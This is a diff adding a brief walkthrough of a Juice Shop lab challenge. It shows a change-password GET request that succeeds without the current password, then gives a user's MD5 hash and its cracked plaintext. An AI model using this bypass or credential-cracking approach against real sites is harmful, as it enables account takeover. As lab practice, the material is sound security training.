@@ -1,0 +1,30 @@
+playing around the change password form we see that the following request is made.
+http://localhost:3000/rest/user/change-password?current=11111111&new=22222222&repeat=22222222
+
+we can see the even if current is not set, we can successfully authenticate and change the password.
+
+making the following request successfully completes the challenge
+http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic
+
+
+
+
+
+
+
+
+
+
+
+alternate method ->
+
+OhG0dPlease1nsertLiquor!
+0c36e517e3fa95aabf1bbffc6744a4ef
+
+using the user details we got earlier, we can access the password hash :
+email : bender@juice-sh.op	
+password :0c36e517e3fa95aabf1bbffc6744a4ef
+
+its a weak md5 hash which can be easily decrypted to see the plain text password.
+plain test password : OhG0dPlease1nsertLiquor!
+
